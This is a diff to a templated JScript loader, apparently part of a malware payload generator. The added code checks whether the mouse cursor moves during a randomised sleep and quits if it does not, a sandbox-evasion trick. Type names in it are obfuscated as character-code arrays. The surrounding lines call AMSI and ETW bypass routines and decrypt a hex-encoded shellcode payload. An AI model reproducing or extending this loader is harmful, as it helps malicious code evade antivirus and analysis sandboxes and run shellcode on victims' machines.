@@ -77,7 +77,22 @@ function {{ v.fn_decrypt }}(d, k) {
 
 function {{ v.fn_exec }}() {
     if ({{ v.fn_sandbox }}()) { WScript.Quit(0); }
+    var _cx = -999, _cy = -999;
+    try {
+        var _a=new ActiveXObject("System.Reflection.Assembly"),_w=_a.LoadWithPartialName({{ v.fn_build_str }}([83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115]));
+        if(_w){var _t=_w.GetType({{ v.fn_build_str }}([83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115,46,67,117,114,115,111,114]));
+        if(_t){var _pp=_t.GetProperty({{ v.fn_build_str }}([80,111,115,105,116,105,111,110]),24);
+        if(_pp){var _ps=_pp.GetValue(null,null);if(_ps){_cx=_ps.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue(_ps,null);_cy=_ps.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue(_ps,null);}}}}
+    } catch(e) {}
     WScript.Sleep(2000 + Math.floor(Math.random() * 3000));
+    if (_cx !== -999) {
+        try {
+            var _a2=new ActiveXObject("System.Reflection.Assembly"),_w2=_a2.LoadWithPartialName({{ v.fn_build_str }}([83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115]));
+            if(_w2){var _t2=_w2.GetType({{ v.fn_build_str }}([83,121,115,116,101,109,46,87,105,110,100,111,119,115,46,70,111,114,109,115,46,67,117,114,115,111,114]));
+            if(_t2){var _pp2=_t2.GetProperty({{ v.fn_build_str }}([80,111,115,105,116,105,111,110]),24);
+            if(_pp2){var _ps2=_pp2.GetValue(null,null);if(_ps2){var _cx2=_ps2.GetType().GetProperty({{ v.fn_build_str }}([88])).GetValue(_ps2,null);var _cy2=_ps2.GetType().GetProperty({{ v.fn_build_str }}([89])).GetValue(_ps2,null);if(_cx===_cx2&&_cy===_cy2)WScript.Quit(0);}}}}
+        } catch(e2) {}
+    }
     {{ v.fn_amsi }}();
     {{ v.fn_etw }}();
     var sc  = {{ v.fn_decrypt }}({{ v.fn_hex2arr }}({{ v.var_sc }}), {{ v.fn_hex2arr }}({{ v.var_key }}));
